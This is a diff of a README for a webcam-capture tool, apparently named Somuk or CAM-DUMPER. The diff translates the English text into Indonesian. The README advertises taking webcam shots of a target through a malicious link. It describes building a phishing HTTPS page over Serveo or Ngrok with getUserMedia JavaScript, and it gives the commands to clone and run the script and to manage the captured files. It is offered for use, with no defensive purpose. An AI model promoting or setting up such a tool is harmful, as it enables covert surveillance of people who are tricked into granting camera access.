@@ -2,25 +2,22 @@
 <p align="center"><img src="Somuk.jpg" max-width="90%%" height="auto"></p>
 <p align="center">Take webcam shots from target by just sending a malicious link</p>
 
-# How it works?
-<p>The tool generates a malicious HTTPS page using Serveo or Ngrok Port Forwarding methods, and a javascript code to cam requests using MediaDevices.getUserMedia. </p>
+Bagaimana cara kerjanya?
+Alat ini menghasilkan halaman HTTPS berbahaya menggunakan metode Serveo atau Ngrok Port Forwarding, 
+dan kode JavaScript untuk memproses permintaan menggunakan MediaDevices.getUserMedia.
 
-<p>The MediaDevices.getUserMedia() method prompts the user for permission to use a media input which produces a MediaStream with tracks containing the requested types of media. That stream can include, for example, a video track (produced by either a hardware or virtual video source such as a camera, video recording device, screen sharing service, and so forth), an audio track (similarly, produced by a physical or virtual audio source like a microphone, A/D converter, or the like), and possibly other track types. </p>
+Metode MediaDevices.getUserMedia() meminta izin kepada pengguna untuk menggunakan input media yang menghasilkan MediaStream dengan trek yang berisi jenis media yang diminta. 
+Aliran tersebut dapat mencakup, misalnya, trek video (diproduksi oleh perangkat keras atau sumber video virtual seperti kamera, perangkat perekam video, layanan berbagi layar, dan sebagainya), 
+trek audio (juga, diproduksi oleh sumber audio fisik atau virtual seperti mikrofon, konverter A/D, atau sejenisnya), dan mungkin jenis trek lainnya.
+Lihat selengkapnya tentang MediaDEvices.getUserMedia() di sini
 
-[See more about MediaDEvices.getUserMedia() here](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia)
-
-## Installing (Kali Linux/Termux):
-
-
-```
+Instalasi (Kali Linux/Termux):
 $ apt update && apt upgrade
 $ apt install git php wget curl jq
 $ git clone https://github.com/Readone99/Somuk
 $ cd CAM-DUMPER
 $ chmod +x camdumper.sh
 $ ./camdumper.sh
-```
+Pengguna Termux disarankan untuk menginstal aplikasi MATERIAL FILES dari Playstore agar mudah mengelola file yang ditangkap.
 
-<p> Termux users should install <a href="https://play.google.com/store/apps/details?id=me.zhanghai.android.files">  MATERIAL FILES  </a> app from playstore for easy managing captured files.</p> 
-
-<b>happy hacking : ]<b>
+Selamat mencoba :]
